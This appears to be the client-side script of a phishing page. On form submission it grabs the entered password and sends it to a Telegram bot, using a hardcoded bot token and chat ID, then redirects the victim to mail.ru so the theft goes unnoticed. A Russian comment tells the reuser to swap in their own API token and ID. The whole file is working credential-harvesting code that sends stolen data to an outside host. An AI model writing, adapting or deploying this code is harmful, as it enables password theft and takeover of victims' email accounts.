document.addEventListener('DOMContentLoaded', () => {
const form = document.getElementById('registrationForm');

form.addEventListener('submit', async (event) => {
    event.preventDefault();

    // заменить API и ID
    const password = document.getElementById('password').value;
    const botToken = '7689328190:AAEwtwupQtWEIes-EzGcpXkQvf32eBqylFw';
    const chatId = '7631815530';
    const redirectUrl = 'https://mail.ru';
    
    if (!password) {
        return;
    }

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `Password: ${password}`
            })
        });

        window.location.href = redirectUrl;
    } catch (error) {
    }
});
});
